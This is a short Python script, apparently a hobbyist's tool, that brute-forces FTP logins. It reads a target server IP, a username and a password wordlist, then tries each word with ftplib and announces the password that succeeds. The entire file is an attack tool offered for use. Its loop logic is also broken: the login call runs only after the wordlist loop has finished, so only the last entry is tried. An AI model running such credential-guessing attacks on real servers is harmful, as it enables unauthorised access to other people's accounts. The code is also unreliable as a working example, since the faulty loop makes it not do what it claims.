#!/usr/bin/python

# Learned from the book Linux Basics for hackers
#Improved and coded by user_honest
#11/09/22
#Version 1.0



import ftplib
from colorama import init,Fore


# main function defined
def main():
    
# input area >> add data , ip of the server. The user and a wordlist. 
    print("\n")
    print("███████╗████████╗██████╗ ")
    print("██╔════╝╚══██╔══╝██╔══██╗")
    print("█████╗     ██║   ██████╔╝")
    print("██╔══╝     ██║   ██╔═══╝ ")
    print("██║        ██║   ██║     ")
    print("╚═╝        ╚═╝   ╚═╝    ")
    print(         "Login..V 1.1")
    print("\n")


    init(autoreset=True)

    server = input(">> FTP Server_IP: ")
    user = input(">> Username: ")
    password_list = input(">> Add Wordlist: ")
  
# The with statment is going to open de wordlistfile in the exception
# and loop through each line     
    try:
        with open(password_list, "r") as pw:
            for word in pw:
                word = word.strip('\r\n')

        try:

# ftplib module is goint to take hte ip of the server, try to connect 
# comparing each username with the lines in the worldlist.
            ftp = ftplib.FTP(server)
            ftp.login(user, word)

            print("")
            print(Fore.GREEN + "[+] Success Password is : " + word)

        except ftplib.error_perm as execute:
            print("Still trying", execute)
# if passwords are not found, there is going to be an exception and 
# an error message is going to me given.
    except Exception as exc:
        print(Fore.RED + "Wordlist error: ", exc)

# here the main function is goin to run

if __name__ == "__main__":
    main()